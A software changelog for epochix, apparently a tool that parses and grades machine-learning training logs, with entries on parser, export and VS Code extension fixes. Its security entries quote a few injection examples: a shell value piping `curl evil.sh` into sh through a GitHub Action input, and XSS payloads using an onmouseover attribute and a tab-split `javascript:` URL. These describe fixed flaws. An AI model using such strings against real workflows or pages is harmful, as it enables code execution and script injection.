# Changelog

All notable changes to **epochix** are documented here.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/)
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

---

## [0.5.96] — 2026-08-14

### Added

- **Classical ML is supported properly** — XGBoost, LightGBM, CatBoost and
  scikit-learn, not just deep learning.

  A new `boosting` parser reads round-by-round evaluation rows and keeps the
  **training and validation curves apart**. They used to collapse: the key
  pattern stopped at the `-` in `validation_0-logloss`, so both eval sets were
  read as `logloss` and the second was dropped as a duplicate. One curve was
  charted and called the whole story — while the distance between the two IS
  the overfitting signal. A real XGBoost run now reports it:

  > Epoch 39: 0.0804, below the best of 0.0781 at epoch 32. The model has
  > passed its peak — the earlier checkpoint is the better one.

  LightGBM's `valid_0's l2` (apostrophe and space inside the metric name) and
  CatBoost's `learn:`/`test:` columns are read too, and the boosting round
  becomes the x-axis.

- **The VS Code extension opens on classical ML.** The detector only knew
  neural-network shapes, so an XGBoost run scored 0.15 against a 0.45
  threshold and the dashboard never appeared. Regression had no signal at all.

- **The metric vocabulary covers classical ML**: `logloss`, `mlogloss`,
  LightGBM's `l1`/`l2`, `merror`, `matthews_corrcoef`, `balanced_accuracy`,
  `explained_variance` and others. Each of these previously fell through to
  the shared `custom` bucket, where unrelated metrics are drawn as one series.

### Fixed

- **A hand-written training loop produced no metrics at all.**
  `epoch 1 loss 0.680 acc 0.535` — no `=`, no `:` — parsed to nothing, because
  every pattern required a delimiter. The extension's detector scored that
  same line 0.90 and opened the dashboard, so the most common beginner print
  format got a dashboard that opened itself and then sat empty.

  Whitespace-separated pairs are now read, but only on a line that opens with
  a counter and only for names the normalizer recognises: a bare "word number"
  is also every sentence containing a number, and inventing a metric is worse
  than missing one.

- **Hyperparameters were charted as results.** `RandomForestClassifier(
  n_estimators=100, max_depth=8)` put `100` and `8` on the same `custom`
  series as a real F1 score. The torch version of this was fixed in 0.5.x by
  listing every torch kwarg by name; scikit-learn, XGBoost and LightGBM each
  have their own vocabulary, so the *shape* is matched instead — a CamelCase
  constructor call and its parentheses are configuration, never measurement.

- **Train and test scores were drawn as a trend.** `Train accuracy: 1.0000`
  and `Test accuracy: 0.9820` were both captured as `accuracy` and charted as
  a two-point series running 1.0 → 0.982 — a decline the model never had.
  They measure different data and are now separate series. Likewise
  `val_rmse`/`val_mae`/`val_r2`, which were stripped to their training form
  and collapsed into one zig-zagging line.

- **"F1 score: 0.98" was recorded as a metric called `score`**, and joined the
  custom bucket alongside anything else unnamed.

- **Ordinary regression was relabelled a gaze model.** Any run whose MAE was
  below 10 got promoted to eye-tracking: a plain Ridge model reporting MAE
  9.83 was narrated as *"the model sees the face but not the gaze"* with the
  value printed in **degrees**. The task, the story and the unit were all
  inferred from one number's magnitude. Gaze now requires a gaze-shaped metric
  name.

- **The regression story named the wrong metric.** The templates wrote "MAE"
  into every sentence regardless, so a run graded on RMSE read *"MAE
  68.0337"* — the number read correctly and then labelled as a metric the run
  never logged. All 40 regression and gaze templates (en/fa/fr) now name the
  series the value came from.

- **MAPE graded backwards on the validation split.** `val_mape` contains
  `map`, a higher-is-better hint, so a run whose percentage error was falling
  graded F while a worsening one graded A+. Plain `mape` had been pinned for
  exactly this reason; every split form is now pinned too.

---

## [0.5.95] — 2026-08-14

### Fixed

- **The prefilled bug report was still double-encoded.** 0.5.76 claimed to fix
  this. It did not: a tester's report still arrived reading
  `%23%23%23 What looks wrong%3F` instead of `### What looks wrong?`.

  The earlier fix decoded the query and rebuilt the `Uri` with `Uri.from`. That
  is a **no-op** — `Uri` stores its query already decoded, so `Uri.parse(url)`
  and the rebuilt `Uri` are byte-identical. It could not have helped, and no
  test compared the two.

  The real cause is one branch in VS Code's own opener:

  ```js
  n = (typeof target === "string" && unchanged) ? target
                                                : encodeURI(uri.toString(true));
  ```

  Given a `Uri`, `toString(true)` writes the query back as raw text and
  `encodeURI` escapes `%`, so every existing escape gains a second round:
  `%23` leaves as `%2523`. Given the original **string**, it is sent untouched.
  Plain `Uri.toString()` is worse again — it escapes the `&` and `=`
  separators, so the receiving site sees one nameless parameter and no `body`
  at all.

  Every external link now goes through a single `openExternalUrl(url)` that
  keeps the string. A test asserts nothing else in the extension calls
  `env.openExternal`, because each previous attempt failed by reintroducing it
  somewhere new.

- **Export could fetch the wrong metric.** The same defect on the export URL:
  a metric name containing `#` or `?` arrived double-encoded, and one
  containing `&` was truncated at it — so the export quietly returned a series
  nobody asked for rather than failing. Spaces, `%` and non-ASCII names were
  unaffected, which is why it went unnoticed.

---

## [0.5.94] — 2026-08-11

### Changed

- **One installer. `pip install epochix` now does everything** — no extras for
  any export format.

  GIF already moved to core in 0.5.92 (pillow). PDF was the hard one: WeasyPrint
  needs GTK system libraries, and `pip install weasyprint` *succeeds* on Windows
  before the import dies loading `libgobject-2.0-0`. Making it a default would
  have broken `pip install epochix` for an entire platform, so it was never an
  option.

  The PDF is rendered with **fpdf2** instead — pure Python, 3.2 MB, its
  dependencies are wheels with no system libraries. The report keeps the same
  shape (cover with the grade, a page per training phase, final metrics) and
  the text stays **real selectable text**, not a rasterised page.

  Verified on a clean wheel install with no extras: JSON 20 KB, Markdown 1 KB,
  GIF 32 KB, PDF 4 KB — all four from one install.

  `epochix[pdf]` and `epochix[gif]` remain as empty aliases so existing
  commands, docs and anyone's notes keep working.

### Fixed

- **Em dashes became `?` in the PDF.** fpdf2's core fonts are Latin-1 and the
  narratives are full of typographic punctuation, so a bare encode produced
  *"63.5% accuracy ? only one direction from here"*. `console_safe` looked like
  the fix but short-circuits when the console can encode — correct for a
  terminal, wrong for a PDF. Split out `transliterate()`, which applies the
  same table unconditionally, and both surfaces now share it.

- **`epochix doctor` reported "PDF export unavailable" while PDF worked.** It
  kept probing `weasyprint` after the backend moved to fpdf2 — advice for a
  package no longer used, about a feature that works. The exact class of false
  statement this tool exists to catch, made by the tool itself. Caught by
  running `doctor` on the published wheel rather than reading the code.

---

## [0.5.92] — 2026-08-11

### Changed

- **GIF export needs no extra install.** Pillow is a core dependency now, so
  `pip install epochix` gets you the animated GIF — the shareable artefact was
  behind a second install for no good reason. Verified on a clean wheel
  install: 32 KB valid GIF, nothing extra fetched. The `gif` extra still exists
  as an empty alias so `pip install 'epochix[gif]'` keeps working.

### Fixed

- **PDF failed with a 500 even for users who installed the extra.** On Windows
  `pip install weasyprint` **succeeds** and the import then dies loading
  `libgobject-2.0-0`, because WeasyPrint needs GTK system libraries the wheel
  does not carry. That is an `OSError`, which nothing caught — so the person
  who followed our own instruction got an unhandled server error telling them
  to install what they had just installed.

  Both causes now raise `PdfUnavailable` and answer 501 with a message that is
  actually true: the extra, the GTK requirement, **and** the route that needs
  no install at all — export HTML and print it to PDF from the browser, since
  the HTML is a single self-contained file.

  This is also why weasyprint cannot become a core dependency the way pillow
  did: it would make `pip install epochix` fail on Windows.

- **`epochix doctor` crashed on a machine with a broken optional extra.** It
  probes each extra with `__import__` and caught only `ImportError` — so
  weasyprint's GTK `OSError` took the whole command down with a traceback. That
  is precisely the machine someone runs `doctor` on. It now reports the broken
  import as a **finding** (`BROKEN - installed but fails to import: …`), which
  is the diagnosis rather than an obstacle to it.

  Surfaced because making pillow core un-skipped every GIF test in CI for the
  first time, which in turn ran `doctor` in an environment that had the broken
  extra installed.

---

## [0.5.91] — 2026-08-11

### Fixed

- **PDF export answered 500 instead of telling you to install the extra.**
  `build_pdf` raises `ImportError` when WeasyPrint is absent, but the route
  caught only `NotImplementedError`, so it escaped as an unhandled server
  error. The GIF route beside it has always answered 501 with
  *"pip install 'epochix[gif]'"*.

  A 500 reads as "this product is broken"; a 501 naming the package reads as
  "you need one more install". For someone trying the tool for the first time
  that is the difference between a bug report and a `pip install`.

  Found by cold-installing the published wheel from PyPI into a clean
  environment — no extras, exactly what a new user gets — and hitting every
  export route the way they would.

### Verified (pre-tester readiness)

- The published **0.5.90** wheel, installed fresh from PyPI: `epochix demo`
  grades the bundled run, a piped training log grades A, `epochix check`
  explains what it can and cannot read, `epochix list` shows both runs,
  `epochix doctor` prints diagnostics plus the report link, the dashboard
  serves on 200, and HTML / Markdown / JSON export at 165 KB / 650 B / 18 KB.

---

## [0.5.90] — 2026-08-10

### Fixed

- **`import-wandb` and `import-tensorboard` crashed with a traceback when the
  port was busy.** Both start their own server through `LiveReporter`, so the
  bind failure happened inside a background asyncio task and surfaced as a raw
  uvicorn stack plus `SystemExit(3)`. `run` has printed *"Port 7860 is already
  in use — try `--port 7861`"* since 0.5.32; these commands were added without
  the guard.

  Not a corner case: the likeliest reason 7860 is taken is that an epochix
  dashboard is already open, which describes exactly the person importing runs.
  Found by running the real command against the live W&B API rather than
  calling the function.

### Verified

- **The W&B importer, against the live API** (task #28 — previously blocked on
  an account). All three documented forms import and grade correctly: a remote
  `entity/project/run_id`, a local `wandb/` directory, and a single
  `run-*.wandb` file.

  The 0.5.85 sampling fix is now confirmed on real data rather than a stub: an
  800-step run returns **800 records from `scan_history()` and 500 from the old
  sampled `history()`**. Pre-fix, that run imported as 500 points presented as
  the whole run — moving the final value, the peak and the grade. A nonexistent
  run raises a named `CommError`, not a traceback.

---

## [0.5.89] — 2026-08-06

### Security

- **`safeUrl` did not stop `javascript:`.** It tested the string it was handed,
  but browsers strip TAB, LF and CR from a URL *before* parsing the scheme — so
  `java<TAB>script:alert(1)` sailed past the check and then executed. Four
  variants were confirmed live in a real DOM. It now tests what the browser
  will see, and refuses protocol-relative `//evil.com` as well.

  Nothing was exploitable: no caller had reached for it yet. That made it worse
  rather than better — an unused guard that does not guard is a trap for
  whoever uses it first. Eighteen cases now cover it.

### Fixed

- **`run --json --export md` emitted invalid JSON.** The export confirmation
  printed to stdout *after* the document, so `json.load` died on "Extra data:
  line 2". The 0.5.80 guard covered the line printed before it and missed the
  one after. Informational output now goes to stderr when stdout is carrying
  JSON — redirected, not silenced, so it is still seen.

- **A missing optional dependency was reported as a bad directory.** With no
  `tensorboard` installed, `import-tensorboard` swallowed the ImportError into
  a per-directory warning and told the user *"No scalar events found. Point
  this at the directory holding events.out.tfevents.*"* — advice that is simply
  wrong for that cause. It now says which package to install. A genuinely
  corrupt sub-directory is still skipped, so one bad run cannot abandon the
  others.

- **`import-wandb` on a local path crashed with a raw traceback** when `wandb`
  was not installed, and again on a truncated `.wandb` file ("Invalid header").
  Neither is exotic — a *running* job has a `.wandb` being written. Both are
  clean messages now, and an unreadable file is skipped rather than abandoning
  the whole directory.

### Changed

- The control-character scan now covers `frontend/` and `epochix-vscode/`, not
  only `src/epochix`. It was added after a shell heredoc turned a character
  range into LITERAL control bytes inside a regex in `escape.js` — which still
  worked, which is exactly why nothing would have caught it. Test files are
  exempt: a test for ANSI stripping has to contain real ESC bytes.

---

## [0.5.88] — 2026-08-05

### Added

- **"this looks wrong" on every reading (#56 complete).** The dashboard could
  report that *something* was off; it could not report that *this number* was
  wrong. That distinction matters here more than in most products: the
  characteristic failure is a page that renders perfectly and states something
  false — a grade on the wrong metric, a peak on the wrong epoch, a narrative
  about progress that did not happen. A report saying "the dashboard looks odd"
  cannot be acted on; one carrying the epoch, the value and the sentence
  written about it can.

  The control sits beside the narrative it disputes, quiet until hovered, and
  opens a prefilled issue with epoch, metric, value, grade, phase, task and
  version — and **no run name, file path or log content**, verified by test and
  in a live browser. A bug report should not be how a project name reaches a
  public issue tracker.

### Changed

- Issue dispatch moved to one `report.js` shared by the global button and the
  per-frame control. The dashboard runs in three environments and a webview
  discards `window.open` **silently** — the button looks like it worked. That
  exact failure already shipped once, for export; one implementation means it
  cannot ship twice.

---

## [0.5.87] — 2026-08-05

### Fixed

- **"Watch Active Terminal" could promise to watch and then do nothing.** The
  whole terminal→dashboard journey rides on VS Code shell integration: without
  it, `onDidStartTerminalShellExecution` never fires and no output is ever
  captured. The command announced *"Watching terminal X. Start your training
  command now."* regardless, then sat silent forever.

  It now checks `terminal.shellIntegration` and says so, with a link to the VS
  Code docs and the pipe fallback (`python train.py | epochix`). Worded as "not
  active yet" rather than "unsupported", because shell integration comes up a
  moment after a terminal opens and a flat claim would be a false alarm on a
  freshly opened one.

  This command already carried a comment about the same failure from a
  different cause. Same shape, second source.

### Verified (no change needed)

- Training detection was driven against all 30 real log fixtures plus the three
  bundled demos: it fires on every one and stays silent on garbage. Fed as a
  live trickle it fires within **1 line** for Keras, Lightning, HuggingFace,
  fastai and key=value logs, and 5 for Ultralytics YOLO, which prints a banner
  first. Six kinds of ordinary terminal output — pip, pytest, npm, git, docker,
  ls — produced no false positives, so the dashboard will not ambush someone
  who is not training.

---

## [0.5.86] — 2026-08-05

### Fixed

- **The comparison never told you why one run won.** `/api/compare` has
  returned a `narrative` since 0.5.43 — the plain-English explanation that the
  whole comparison feature exists to produce — and the compare view fetched it
  and dropped it on the floor. For these two runs the API was returning:

  > lower-lr finished ahead of baseline: 0.9020 against 0.7610 (val_accuracy).
  > baseline peaked at 0.8450 on epoch 7 and ended worse, at 0.7610. Had it
  > stopped at its best the gap would have been 0.0570 rather than 0.1410.

  and the screen showed a chart and two coloured legend entries. Task #46 was
  marked done; only the API half was. It now renders above the chart, escaped
  (it is built from run names, which come from log files), and stays absent
  when the engine declines to pick a winner — different metrics, or a gap
  inside the runs' own noise.

  Found by opening the compare view in a browser and reading the page. Nothing
  was broken, nothing errored, everything rendered — which is why no test and
  no scanner had anything to say about it.

---

## [0.5.85] — 2026-08-05

### Fixed

- **Importing a W&B run over the API silently downsampled it.** The importer
  called `run.history()`, which takes `samples=500` — its own docstring says
  *"if you are ok with the history records being sampled."* Any run longer than
  500 logged steps was imported as 500 points **presented as the run**, which
  moves the final value, the peak, and therefore the best-epoch call and the
  grade. Reporting a best epoch that is not the best epoch is exactly the kind
  of false statement this project refuses to make, and the sampling was
  invisible: the curve still looked like a curve.

  Now uses `scan_history()`, which pages through every record. It also yields
  plain dicts, so pandas is no longer implicitly required.

  The API path had never been exercised at all. It now is, against a stub
  `wandb` — everything but the network — including a 2000-step run that must
  import 2000 points and must not call `history()`.

---

## [0.5.84] — 2026-08-05

### Added

- **`epochix import-wandb <path>` — read W&B runs off local disk, no account.**
  The importer was API-only, which put the strongest thing we can say to a W&B
  user — *point it at the runs you already have* — behind a login and an API
  key. Every W&B run writes a directory; this reads it. Pass your `wandb/`
  folder, one run directory inside it, or the `run-*.wandb` file. Anything that
  is not an existing path is still treated as `entity/project/run_id` and
  fetched through the API.

  The layout is not what it looks like from outside, so this was built against
  a real run produced by `wandb.init()` under `WANDB_MODE=offline` rather than
  from assumption: there is no `wandb-summary.json` and no `output.log`, the
  history lives only in the binary `run-*.wandb` record log, and history items
  carry their name in `nested_key` rather than `key`. That file is the test
  fixture — a hand-written one would have encoded the wrong guesses and passed.

### Fixed

- **`mypy --strict` failed on any machine with `wandb` installed.** Same shape
  as the tensorboard case in 0.5.83: calls into wandb's untyped internals and a
  generated protobuf module whose attributes mypy cannot see. Invisible in CI,
  whose typecheck environment has no wandb, while failing for every developer
  who had it. Scoped to `epochix.integrations.wandb_import` and checked both
  with and without the package present.

---

## [0.5.83] — 2026-08-04

### Fixed

- **`epochix import-wandb` and `epochix import-tensorboard` were documented but
  did not exist.** Both importer modules carry a usage example naming a CLI
  command, and neither was registered — the only way to reach either was the
  Python API. Same shape as the `epochix batch` call in the shipped Action.

  Both are real commands now. `import-tensorboard <logdir>` needs no account
  and no network: verified against a real `events.out.tfevents.*` file, which
  imported as a graded run. `import-wandb <entity/project/run_id>` talks to the
  W&B API and therefore needs a key — it does **not** read a local `wandb/`
  directory, and it remains unverified against the live API.

- **`mypy --strict` failed wherever `tensorboard` was actually installed.** The
  import carried `# type: ignore[import-not-found]`, but an installed
  tensorboard ships no `py.typed`, so the real error is `import-untyped` and
  the inline ignore became "unused". CI never saw it because CI's typecheck
  environment has no tensorboard. Moved to the `[[tool.mypy.overrides]]` block
  beside PIL, which is correct in both environments; checked with and without.

### Changed

- The CLI contract test now also asserts that every `epochix <cmd>` shown as a
  shell example in `src/` docstrings resolves to a real command, not just those
  in `.github/actions`.

---

## [0.5.82] — 2026-08-03

### Fixed

- **`/api/version` reported the installed package, not the running code.**
  `__version__` came from `importlib.metadata.version("epochix")`, which reads
  the *installed* distribution's metadata. On a machine with a release
  installed alongside a source checkout, running from the checkout reported the
  installed number — it said 0.5.75 while serving 0.5.80 source.

  Not cosmetic: the VS Code extension compares `/api/version` against its own
  version to warn about a stale Python package, so a wrong answer either raises
  a false alarm or hides a real one. A `pyproject.toml` above the package root
  now means the tree's version is the truthful answer; installed copies keep
  using metadata, verified against a real built wheel.

---

## [0.5.81] — 2026-08-03

### Fixed

- **Every run the VS Code extension saved looked ungraded and still running.**
  Runs persisted through `POST /runs/{id}/event` kept the placeholder values
  set at creation, so `epochix list` showed them as:

  ```
  Y  01KZ...  [-]  custom  my run
  ```

  no grade, task `custom`, running spinner forever — however good the run was.
  The frames underneath were always correct and carried real per-epoch grades;
  only the row a user browses was wrong, which is why nothing noticed.

  The server now writes the summary back to the run row as each frame is
  produced, so the grade is right while the run is still live rather than only
  once something declares it over. `EventPushRequest` also gained a `finished`
  flag: the server cannot tell "the log ended" from "the next event is slow",
  and the extension now sets it on a final event after its batches drain.

  Found by driving the extension's real persist path against a live server.
  No test covered it because checking required listing runs after pushing some.

### Added

- `RunStore.update_run_summary()` — refreshes grade, task, primary metric and
  summary **without** stamping `finished_at`, which `finish_run` does and which
  is wrong while events are still arriving.

---

## [0.5.80] — 2026-08-03

### Fixed

- **The GitHub Action we ship had never worked.** `action.yml` ran
  `epochix batch <log> --json --headless` and parsed `d['id']` from stdout.
  There is no `batch` command, `run` had no `--json`, and no command printed
  JSON at all — every part of that step was fiction, so the Action failed for
  every caller since it shipped. Nothing caught it because the Action is YAML
  that CI never executes.

  `tests/unit/test_action_cli_contract.py` now compares every `epochix <cmd>`
  in `.github/actions` against the real command list, the same shape as the
  extension/OpenAPI test that caught the `/api/parse` endpoint.

- **The release SBOM listed zero dependencies.** `anchore/sbom-action` was
  pointed at `dist/`, a directory of unbuilt archives; syft reads
  `*.dist-info/METADATA` from *installed* packages, so it found nothing and
  emitted a valid, empty CycloneDX document. A scanner consuming it reports
  all-clear. Now installs the wheel into a scratch env and scans that, and the
  job fails if the result has under 10 components.

### Added

- **`epochix run --json`** — one JSON document on stdout (`id`, `name`,
  `final_grade`, `task`, `primary_metric`, `story_summary`) and nothing else,
  so automation can pipe it straight into `json.load`. Implies `--headless`.

- **A "Report a Bug" button in the VS Code sidebar**, opening a prefilled issue
  with the environment already filled in — including the Python package version
  answering on the sidecar, since a stale one silently degrades the whole
  product and has been the cause more than once. No run name, file path or log
  content is included.

### Changed

- The composite action moved from `setup-python` v5 to v7, matching our own
  workflows — the shipped action is the wrong place to lag, since old action
  runtimes get deprecated in *other people's* repos.

- `upload-artifact` and `download-artifact` are ignored for semver-major in
  Dependabot. They are a pair, `release.yml` uploads in one job and downloads
  in another, and the working combination shipped 0.5.79.

---

## [0.5.79] — 2026-08-02

### Security

- **The shipped GitHub Action could run attacker-supplied shell
  (`actions/code-injection`, 7 alerts).** `.github/actions/epochix/action.yml`
  interpolated `${{ inputs.log-file }}`, `${{ inputs.task }}` and step outputs
  directly into `run:` and `script:` bodies. GitHub substitutes an expression
  into the script *before* bash or Node parses it, so a log-file value of
  `x"; curl evil.sh | sh; "` executed in the caller's runner — and callers
  routinely wire these inputs to PR titles and branch names. Every value now
  reaches the script through `env:`, where it is data rather than source.

- **Workflow tokens were write-capable by default
  (`actions/missing-workflow-permissions`, 19 alerts).** All six workflows now
  declare `permissions: contents: read` at the top level. The four release jobs
  that genuinely need to write already declared it themselves, and none of them
  check out the repo.

- **Every action was referenced by a movable tag (`actions/unpinned-tag`,
  13 alerts).** A tag can be repointed at different code by whoever owns it.
  All 67 `uses:` are pinned to a 40-character commit SHA with the version kept
  as a trailing comment. Dependabot already watches this ecosystem and updates
  SHA pins in place.

- **A run name containing a regex backreference crashed the HTML export.**
  `re.sub` expands backslash escapes in a *string* replacement, so a run named
  `run\1` or `run\g<0>` raised `re.error` and returned a 500. Run names come
  from log files. The replacement is a function now, which is inserted
  literally. The exporter's hand-rolled escaper was also replaced with
  `html.escape` — it was correct, but there is no reason to keep re-deriving
  this after the frontend's eleven copies got it wrong.

- **Untrusted values reached log lines unescaped (`py/log-injection`,
  3 alerts).** A run id containing a newline forged log entries, and one
  containing ANSI escapes could colour the forgery to match. `log_safe` in
  `server/logsafe.py` now collapses control characters to `?` — marking the
  tampering rather than hiding it — at all three sinks in `ws.py` and `sse.py`.

- **The webview bridge accepted messages from any frame
  (`js/missing-origin-check`).** `vscode-bridge.js` now rejects any sender that
  is neither the embedding page nor the extension host. Deliberately a source
  check rather than an origin check: a webview's origin is an opaque
  `vscode-webview://<uuid>` that changes per session, so an origin allow-list
  would be either wrong or `*`.

---

## [0.5.78] — 2026-08-02

### Security

- **Stored XSS via run name (CodeQL `js/incomplete-html-attribute-sanitization`,
  11 alerts).** The dashboard had eleven copy-pasted `_esc` helpers, and every
  one escaped `&`, `<` and `>` but not quotes. Most were used inside attribute
  values, so a run named `x" onmouseover="alert(1)` closed the attribute and
  installed a live event handler. Run names come from log files — a training
  script was enough to trigger it, with no access to the machine, and it fired
  inside the VS Code webview too.

  Confirmed in a real DOM before the fix and re-checked after: the injected
  handler was a live attribute; it no longer is. All eleven copies are gone,
  replaced by one `escapeHtml` in `frontend/src/escape.js` that escapes both
  quote characters, so it is safe in text and attribute position alike. A
  `safeUrl` helper joins it for `href`/`src`, where escaping alone cannot stop
  `javascript:`.

---

## [0.5.77] — 2026-08-02

### Security

- **A configured LLM endpoint could be any URL scheme, including `file://`.**
  `EPOCHIX_LLM_URL` is user-set and `urllib.request.urlopen` honours `file:`,
  so a typo or a hostile config file turned "call my local model" into "read
  this path off the disk and feed it into a prompt". The endpoint is now
  checked against an `http`/`https` allow-list before the request is built.

- **A bidirectional control character sat in the source.** `gif_export.py`
  carried a live U+202E inside the docstring explaining why bidi characters
  are dangerous. These reorder how text *displays* without changing what the
  interpreter runs, so a reviewer and the machine can read a diff differently.
  It is gone, and a test now fails if any invisible format character reappears
  anywhere under `src/epochix`.

### Fixed

- **`pytest` tested the installed package, not your working tree.** With a
  released epochix in site-packages, a plain `python -m pytest` imported that
  copy instead of `src/`, so the suite passed against code you were not
  editing — locally the tree was 0.5.76 while the tests ran 0.5.75. Pytest now
  puts `src` first. CI was never affected; it builds from the tree.

### Changed

- The `metric_events` migration no longer builds its copy statement by string
  interpolation. Column names cannot be bound as query parameters, so that
  shape is one schema change away from real SQL injection; the statement is
  now a literal. Its first tests come with it — the migration rewrites
  databases that already exist on users' machines and nothing covered it.

- `bandit` runs in CI on every change, failing on medium and high findings.

---

## [0.5.76] — 2026-07-30

### Fixed

- **The prefilled bug report arrived double-encoded from VS Code.** The issue
  body showed `%23%23%23 What looks wrong%3F` instead of `### What looks
  wrong?`, and the `labels=correctness` was mangled badly enough that GitHub
  ignored it and opened a blank issue instead of the template.

  `vscode.Uri.parse()` treats an already percent-encoded query as literal text
  and encodes it a second time, so `%23` became `%2523`. Decoding the query
  once and handing the raw string to `Uri.from` leaves exactly one round of
  encoding.

  Missed because `window.open` in a browser does not re-encode, and that is
  the only path I tested — the same one-environment mistake as 0.5.56.

---

## [0.5.75] — 2026-07-30

### Added

- **Report a problem, from the dashboard.** Until now a tester had to know the
  repo URL and navigate to GitHub themselves — `epochix doctor` and the issue
  templates existed, but nothing connected a person looking at a wrong number
  to the place they could say so.

  The button beside Export opens a prefilled issue labelled `correctness`,
  carrying the **shape** of the run and nothing that identifies it: version,
  surface, metric, task, epoch count, last value, grade, browser. No run name,
  no file path, no log content — verified by assertion, not by inspection.

  In the VS Code webview it routes out through the extension host, the same
  path the exports use.

---

## [0.5.74] — 2026-07-30

### Added

- **`epochix doctor`** — diagnostics to paste into a bug report: versions, which
  optional extras resolve, whether the dashboard bundle shipped, and how many
  runs the database holds.

  It reports **only** that. Run names come from log files and file paths
  identify people's machines; neither belongs in a public issue, and a test
  asserts none of them appear in the output.

- **Two issue templates**, split on purpose:

  - *"A number or a sentence looks wrong"* — for when the product runs fine and
    says something untrue. This is the failure mode Epochix actually has: a
    wrong grade or a confident sentence about a NaN breaks no test and raises
    no error, so we only learn about it when someone says so.
  - *"Something is broken or does nothing"* — and it says explicitly that
    "it did nothing" is a real report, because several buttons have shipped
    that rendered correctly and were completely inert.

---

## [0.5.73] — 2026-07-30

### Fixed

- **NaN, infinity and negative losses were narrated as fact — with a verdict
  attached.** 0.5.72 stopped bounded metrics claiming impossible percentages,
  but only bounded metrics were guarded. Feeding deliberately malformed input
  produced:

  - `nan` → *"Last improvements are incremental. **nan**. Excellence within
    reach."*
  - `inf` → *"the metric sits at **inf**"*
  - `-3.2` loss → *"Last improvements are incremental. **-3.2000**. Excellence
    within reach."*

  Worse than the 110% case, because each attaches a confident judgement to a
  number that means nothing.

  The domain check now covers all three: non-finite values for any metric, and
  negatives for quantities with a hard floor at zero (losses, errors, MAE,
  RMSE, MAPE, perplexity, distances). Each says which fault it is — a NaN
  usually means the loss diverged, and saying so is more useful than silence.

  Healthy runs are untouched, and large legitimate values still pass: a
  `val_loss` of 38.4 and an `MAE` of 7.2 are ordinary readings, not errors.

---

## [0.5.72] — 2026-07-30

### Fixed

- **The story narrated impossible values as fact.** A `val_accuracy` of 1.1 was
  graded **A+** and described as *"At 110.0%, the model approaches its
  ceiling"* — an interpretation of a number that cannot exist. This is the
  123.6% fault in a new place: #38 fixed frames carrying the *wrong metric*,
  this was the right metric carrying an *impossible value*, with nothing
  checking the domain before building a confident sentence on it.

  A bounded metric outside [0, 1] now says what is actually known: the value,
  that it is out of range, and that the units are worth checking. No reading is
  given for that epoch.

  Deliberately **not** rejected at ingest — logging accuracy on a 0–100 scale
  is a common, legitimate pattern, and refusing it would break real users. The
  lie was in the narration, so that is what was fixed.

- **"X finished ahead of X"** in the comparison narrative. Two runs of the same
  experiment usually share a name; colliding labels now take a short id suffix,
  and only where the collision actually occurs.

### Changed

- `UNIT_BOUNDED_METRICS` and `is_unit_bounded()` now live in
  `story_engine/grade.py`, which already owns metric semantics. `gif_export`
  had its own copy of the same list — two copies of "which metrics are
  bounded" is exactly how the parsers drifted.

### Verified

Two live trainings driven concurrently — 120 interleaved events, deliberately
far-apart value ranges — showed no cross-contamination, no lock errors and no
engine-map collisions. Each run kept its own series.

---

## [0.5.71] — 2026-07-30

### Fixed

- **The comparison narrative was empty on every real run.** "Explain WHY one
  run beat another" returned an empty string — worse than returning something
  wrong, because the feature looked *absent* rather than broken, and an empty
  string is exactly what the schema documents for "cannot be compared".

  Same root cause as 0.5.70: `trajectory_from_frames` refuses frames that
  carry a value without naming the metric, which is every run written before
  that name was stored on the frame. The run record still knows, so the
  comparison route now passes it.

  On two real 25-epoch runs it now says what it was built to say: which
  finished ahead, that one peaked at epoch 6 and ended worse, and that
  stopping at its best would have left a gap of 0.4273 instead of 0.5432.

### Known

- When two runs share a name the narrative reads "X finished ahead of X".
  Correct, but hard to follow — it needs to disambiguate.

---

## [0.5.70] — 2026-07-30

### Fixed

- **The default GIF export failed on real runs.** A run whose story frames
  carry a value but no metric name — every run written before that name was
  stored on the frame — was refused with "no metric series to animate", while
  `?metric=` and `?chart=overlay` on the *same run* worked. The run record
  still knows which metric it is and the events still hold the series, so the
  default path now reads from those instead of discarding data that is plainly
  present.

  Found by walking the whole export surface against a real 25-epoch run rather
  than a fixture: seven routes returned 200 and the most-used one returned 400.

  A run that declares a primary metric it never logged still fails, but in its
  own words. Falling through to "no series named val_loss" would answer a
  question the caller never asked — they requested the default.

---

## [0.5.69] — 2026-07-30

### Added

- **A second chart kind: the train-vs-validation overlay.** Every GIF until now
  was one curve, and one curve cannot show a gap — which is the thing people
  most want a picture of.

  ```
  epochix export <run> --format gif --chart overlay
  GET /api/export/{run_id}/gif?chart=overlay
  ```

  Three decisions, each of which could have gone the other way:

  - **Both series share one axis.** Scaling them separately would make a
    widening gap look constant, which is the one thing this chart exists to
    reveal.
  - **The marker sits on the best *validation* epoch**, not the last one.
    "It peaked at 12 and you trained to 25" is the actionable part; the final
    number is not.
  - **A run with only one side is refused, and told what it does have.** The
    default test fixture logs `train_loss` with `val_accuracy` — deliberately
    not a pair, because loss against accuracy on one axis is nonsense units.

  Run against a real 25-epoch run it does its job immediately: train loss
  falls to 5.48 while validation bottoms out near epoch 12 and never improves,
  ending at 38.40.

---

## [0.5.68] — 2026-07-30

### Added

- **`epochix race`** — the comparison race from a terminal, which until now
  existed only as an HTTP route:

  ```
  epochix race <run-a> <run-b> [--metric MAE] [--output race.gif]
  ```

### Fixed

- **Long run names ran through their own scores in the race legend.** The label
  was cut at a fixed 22 characters, which cannot know how wide a glyph is —
  two real runs both called `gazenet-gazecapture-24subj` overlapped the values
  beside them. The label is now trimmed to the room actually left after the
  score, measured with the font.

  Found by racing two real runs from the developer's own database. The
  synthetic fixtures used short names like `baseline` and `tuned`, which is
  exactly the shape of input that hides this.

---

## [0.5.67] — 2026-07-30

### Fixed

- **The Open in Browser button did not appear.** Shipped in 0.5.66 and invisible
  in the Runs sidebar: the link label carried a codicon,
  `[$(link-external) Open in Browser](command:…)`, and a `$(icon)` inside a
  link label is not the same parse path as one in plain text. The link failed
  to parse and was dropped without a word, while every other line rendered
  normally.

  The label is now plain text, matching the four links that always worked.
  (`▶ Try a Demo Run` was never affected — that is a literal character, not a
  codicon.)

---

## [0.5.66] — 2026-07-30

### Added

- **Open in Browser**, in the Runs sidebar and the command palette. It
  deep-links to the run currently on screen, or the run list when there is
  none.

  The webview is convenient but constrained — it blocks downloads outright,
  and exports have to be bounced out through the extension host to land
  anywhere. A browser has none of that, so this is both a convenience and the
